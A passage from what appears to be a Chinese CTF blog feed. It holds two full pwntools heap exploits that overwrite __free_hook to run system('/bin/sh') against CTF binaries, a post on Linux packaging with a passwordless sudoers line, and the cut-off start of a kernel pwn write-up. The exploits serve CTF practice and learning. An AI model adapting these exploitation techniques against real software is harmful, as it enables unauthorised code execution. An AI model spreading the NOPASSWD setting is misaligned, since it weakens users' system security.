class="line">r.sendline(<span class="string">b&#x27;196082&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x220</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x310</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x220</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0xdeadbeef</span>) * <span class="number">16</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xc40</span> + <span class="number">1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>, <span class="literal">True</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x310</span>, <span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gem: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[Y/N]&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>, <span class="number">0</span>)</span><br><span class="line">create(<span class="number">3</span>, idx=<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,</span><br><span class="line">     p8(<span class="number">0xaa</span>) * <span class="number">8</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[Y/N]&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Please give the evolution password: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">r.send(</span><br><span class="line">    xor(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">        p8(<span class="number">0xaa</span>) * <span class="number">8</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="sharing"><a href="#sharing" class="headerlink" title="sharing"></a>sharing</h2><p>相较于上一道题，这道题的难度可以说是十分简单，但是很烦的一点就是这道题目使用cpp写的，我对于cpp的逆向一直都不知道怎么入手，所以去问了大师傅，大师傅说<strong>对于cpp的逆向先是用ida搞清楚基本的功能，程序的特性利用动态调试来挖掘</strong>不过愚钝的我也不明白这道题到底是怎么想到create的idx相同时会free掉当前idx已存在的chunk，可能这就是经验积累吧。</p><p>这道题知道了这样会free的话就很好做了这里就只贴exp了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sharing&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./sharing&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Idx: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Sz: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">from_idx, to_idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;From: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(from_idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;To: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(to_idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Idx: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Idx: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0xdead</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Hint: &#x27;</span>, p32(<span class="number">0x2F767991</span>) + p32(<span class="number">0</span>) * <span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Addr: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(addr), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x510</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x500</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x90</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x90</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x145a0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x30</span>)</span><br><span class="line">target = heap_base + <span class="number">0x14930</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    hint(target)</span><br><span class="line">edit(<span class="number">6</span>, p64(libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">hint(heap_base + <span class="number">0x10</span>)</span><br><span class="line">hint(heap_base + <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">11</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">11</span>, p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">move(<span class="number">7</span>, <span class="number">6</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>剩下的题本来想复现musl了但是没有题目，然后就是其他题目我是真的要疯了，md全是cpp我属实需要下去再学习一段时间，后面复现D3的kernel。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="chunk overlapping" scheme="https://cv196082.gitee.io/tags/chunk-overlapping/"/>
    
  </entry>
  
  <entry>
    <title>linux软件安装时到底在做什么?</title>
    <link href="https://cv196082.gitee.io/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/"/>
    <id>https://cv196082.gitee.io/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/</id>
    <published>2022-04-07T02:22:57.000Z</published>
    <updated>2022-04-07T03:37:08.208Z</updated>
    
    <content type="html"><![CDATA[<p>除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>linux的依赖问题一直是被人诟病的，尤其是debian系的(arch系我感觉几乎没遇到过依赖问题)，在进行安装的总是会出来这个套那个，导致我以前使用ubuntu时安装一个程序可能得花上一下午的时间，而且几乎全部时间都在解决依赖问题。</p><p>那么问题来了，<strong>依赖到底是什么？</strong></p><p>首先需要说明的是windows和linux其实都是存在依赖问题的，比如我以前在windows虚拟机里面运行ida的时候就会出现依赖问题，不过网上都有现成的包直接安装就好。虽然按理来说linux也存在依赖的包，但是为什么linux的依赖问题会比windows更加经常发生呢？</p><p>举个例子：现在运行一个程序需要依赖a-1，我使用windows找到了这个依赖的安装包，实际上这个安装包安装下来的是a-1,a-2,,,,a-30。但是纯纯的linux只会帮你安装a-1，下一次遇到需要a-12的时候，windows不会报错但是linux又需要安装另外版本的依赖了。</p><p>上面的看过了之后就大概对linux的依赖问题有一定了解了，那么为了更好的了解依赖问题我们首先需要知道</p><h2 id="安装一个包的过程"><a href="#安装一个包的过程" class="headerlink" title="安装一个包的过程"></a>安装一个包的过程</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220407105433893.png"                      alt="image-20220407105433893"                ></p><p>首先可以看到linux和window的不同，linux的安装包是真的非常单纯的压缩整合到一起，最后由包管理器将不同功能的文件放到不同目录。</p><p>在上面这张图里面我们需要重点关注的data.tar.xz</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220407105631804.png"                      alt="image-20220407105631804"                ></p><p>查看其内部可以发现就是一个usr目录</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220407105659439.png"                      alt="image-20220407105659439"                ></p><p>这里就是我们熟悉的desktop，也就是桌面图标</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220407105758879.png"                      alt="image-20220407105758879"                ></p><p>可以看到bin目录是一个链接符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcdy@archlinux /mnt/5F2601400CC8834D/save/usr/bin % ls -l typora </span><br><span class="line">lrwxrwxrwx 1 root root 22 Apr  7 10:51 typora -&gt; ../share/typora/Typora</span><br></pre></td></tr></table></figure><p>可以看到就是链接到了一个可执行文件，当我们双击文件就可以打开typora了。</p><p>找到可执行程序之后只需要使用ldd即可查看需要的依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tcdy@archlinux ..5F2601400CC8834D/save/usr/share/typora % ldd Typora </span><br><span class="line">linux-vdso.so.1 (0x00007ffe581fd000)</span><br><span class="line">libffmpeg.so =&gt; /mnt/5F2601400CC8834D/save/usr/share/typora/./libffmpeg.so (0x00007fefa6baa000)</span><br><span class="line">libdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fefa6b7e000)</span><br><span class="line">libpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fefa6b79000)</span><br><span class="line">libgobject-2.0.so.0 =&gt; /usr/lib/libgobject-2.0.so.0 (0x00007fefa6b1a000)</span><br><span class="line">libglib-2.0.so.0 =&gt; /usr/lib/libglib-2.0.so.0 (0x00007fefa69dc000)</span><br><span class="line">libxshmfence.so.1 =&gt; /usr/lib/libxshmfence.so.1 (0x00007fefa69d7000)</span><br><span class="line">libgio-2.0.so.0 =&gt; /usr/lib/libgio-2.0.so.0 (0x00007fefa6807000)</span><br><span class="line">libnss3.so =&gt; /usr/lib/libnss3.so (0x00007fefa66d4000)</span><br><span class="line">libnssutil3.so =&gt; /usr/lib/libnssutil3.so (0x00007fefa66a1000)</span><br><span class="line">libsmime3.so =&gt; /usr/lib/libsmime3.so (0x00007fefa6678000)</span><br><span class="line">libnspr4.so =&gt; /usr/lib/libnspr4.so (0x00007fefa6636000)</span><br><span class="line">libatk-1.0.so.0 =&gt; /usr/lib/libatk-1.0.so.0 (0x00007fefa660c000)</span><br><span class="line">libatk-bridge-2.0.so.0 =&gt; /usr/lib/libatk-bridge-2.0.so.0 (0x00007fefa65d4000)</span><br><span class="line">libdbus-1.so.3 =&gt; /usr/lib/libdbus-1.so.3 (0x00007fefa6581000)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>可以看到这里甚至于有依赖就在当前目录寻找了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220407110347849.png"                      alt="image-20220407110347849"                ></p><p>可以看到这里的文件其实也就包含了上面所需要的一部分依赖，其实这也是很多windows程序的思路，如果程序存在很多不常见到的依赖就会把依赖和程序捆绑起来进行安装。</p><p>其实到这里大家都大概知道了包管理器在安装程序时到底是干了什么，其实就是将不同功能的程序放进了不同目录。</p><h2 id="AUR-PKGBUILD的编写"><a href="#AUR-PKGBUILD的编写" class="headerlink" title="AUR-PKGBUILD的编写"></a>AUR-PKGBUILD的编写</h2><p>一样拿typora举例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Maintainer: Jonas Bögle &lt;aur@iwr.sh&gt;</span></span><br><span class="line"><span class="comment"># Contributor: Jonathan Duck &lt;duckbrain30@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line">_pkgname=typora</span><br><span class="line">pkgname=<span class="string">&quot;<span class="variable">$_pkgname</span>-free&quot;</span></span><br><span class="line">pkgver=0.11.18</span><br><span class="line">pkgrel=2</span><br><span class="line">pkgdesc=<span class="string">&quot;A minimal markdown editor and reader.&quot;</span></span><br><span class="line">arch=(<span class="string">&#x27;x86_64&#x27;</span>)</span><br><span class="line">filename=<span class="string">&quot;typora_<span class="variable">$&#123;pkgver&#125;</span>_amd64.deb&quot;</span></span><br><span class="line">license=(<span class="string">&#x27;custom:&quot;Copyright (c) 2015 Abner Lee All Rights Reserved.&quot;&#x27;</span>)</span><br><span class="line">url=<span class="string">&quot;https://typora.io/&quot;</span></span><br><span class="line">depends=(<span class="string">&#x27;gtk3&#x27;</span> <span class="string">&#x27;libxss&#x27;</span>)</span><br><span class="line">optdepends=(</span><br><span class="line"><span class="string">&#x27;noto-fonts-emoji: Or some other emoji font to see emojis&#x27;</span></span><br><span class="line"><span class="string">&#x27;pandoc: Import/export for extra file formats&#x27;</span>)</span><br><span class="line">provides=(<span class="string">&quot;<span class="variable">$_pkgname</span>&quot;</span>)</span><br><span class="line">conflicts=(<span class="string">&quot;<span class="variable">$_pkgname</span>&quot;</span>)</span><br><span class="line"><span class="built_in">source</span>=(<span class="string">&quot;https://typora.io/linux/<span class="variable">$filename</span>&quot;</span>)</span><br><span class="line">sha512sums=(<span class="string">&#x27;8933cb4eab13a37719a3771d14a7a3f5951f6bbce06381ffe37ad5bc3029efed3878723427a4e97b83dbc1d7ccc43b31551b0c336663c843f0e685f8a4e2390e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">package</span></span>() &#123;</span><br><span class="line">bsdtar -xf data.tar.xz -C <span class="string">&quot;<span class="variable">$pkgdir</span>/&quot;</span></span><br><span class="line">rm -rf <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/lintian/&quot;</span></span><br><span class="line">chmod 4755 <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/typora/chrome-sandbox&quot;</span></span><br><span class="line"><span class="comment"># Remove write permission for group/other</span></span><br><span class="line">chmod -R go-w <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/typora/resources/node_modules&quot;</span></span><br><span class="line">sed -i <span class="string">&#x27;/Change Log/d&#x27;</span> <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/applications/typora.desktop&quot;</span></span><br><span class="line">find <span class="string">&quot;<span class="variable">$pkgdir</span>&quot;</span> -<span class="built_in">type</span> d -<span class="built_in">exec</span> chmod 755 &#123;&#125; \;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的名字，版本，架构什么就不说了，主要关注下面的内容。</p><p>首先是这里source，很明显就是再往上的这个文件的deb包，下面sha512sums就是检验码。</p><p><strong>srcdir</strong></p><p>​    <em>makepkg</em>将会把源文件解压到此文件夹或在此文件夹中生成指向 PKGBUILD 里 source 数组中文件的软连接。</p><p><strong>pkgdir</strong></p><p>​    makepkg会把该文件夹当成系统根目录，并将软件安装在此文件夹下。</p><p>重点就是下面的打包函数，可以看到首先是解压了data.tar.xz这个包带pkgdir。后面就是删除个东西，然后改变权限(可以看到typora是Electron)，下面就是创建图标，最后就是修改pkgdir下目录的权限为755。</p><p>关于aur的更多可以看<a class="link"   href="https://wiki.archlinux.org/title/Creating_packages" >archwiki<i class="fas fa-external-link-alt"></i></a></p><h2 id="sudo免密码"><a href="#sudo免密码" class="headerlink" title="sudo免密码"></a>sudo免密码</h2><p>这个是我每次装完系统必干的一件事情，不过经常忘，而且网上的很多东西都不能实现。所以这里自己记录一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">your_username ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure><p>删除<code>/etc/sudoers.d/10-installer</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实程序的安装并没有我以前想象的那么复杂，至少对于linux来说是这样的。如果遇到什么有趣的linux操作我也会及时分享。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。&lt;/p&gt;
&lt;h2 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; c</summary>
      
    
    
    
    <category term="搞机" scheme="https://cv196082.gitee.io/categories/%E6%90%9E%E6%9C%BA/"/>
    
    
    <category term="deb" scheme="https://cv196082.gitee.io/tags/deb/"/>
    
    <category term="aur" scheme="https://cv196082.gitee.io/tags/aur/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn基础[2]</title>
    <link href="https://cv196082.gitee.io/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/"/>
    <id>https://cv196082.gitee.io/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/</id>
    <published>2022-03-24T06:47:50.000Z</published>
    <updated>2022-03-24T06:47:06.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h2><p>这次题目的附件只有驱动和文件系统没有bzImage</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcdy@arch-linux ..study_kernel/2018_0CTFFinalsBabyKernel % strings baby.ko | grep vermagic=</span><br><span class="line">vermagic=4.15.0-22-generic SMP mod_unload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ sudo apt download linux-image-4.15.0-22-generic </span><br><span class="line">Get:1 https://mirrors.ustc.edu.cn/ubuntu bionic-updates/main amd64 linux-image-4.15.0-22-generic amd64 4.15.0-22.24 [7,875 kB]</span><br><span class="line">Fetched 7,875 kB <span class="keyword">in</span> 1s (5,913 kB/s)</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ ar x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ tar -xf data.tar.xz</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ <span class="built_in">cd</span> boot/</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel/boot$ file vmlinuz-4.15.0-22-generic </span><br><span class="line">vmlinuz-4.15.0-22-generic: Linux kernel x86 boot executable bzImage, version 4.15.0-22-generic (buildd@lgw01-amd64-013) <span class="comment">#24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018, RO-rootFS, swap_dev 0x7, Normal VGA</span></span><br></pre></td></tr></table></figure><h3 id="分析驱动"><a href="#分析驱动" class="headerlink" title="分析驱动"></a>分析驱动</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span 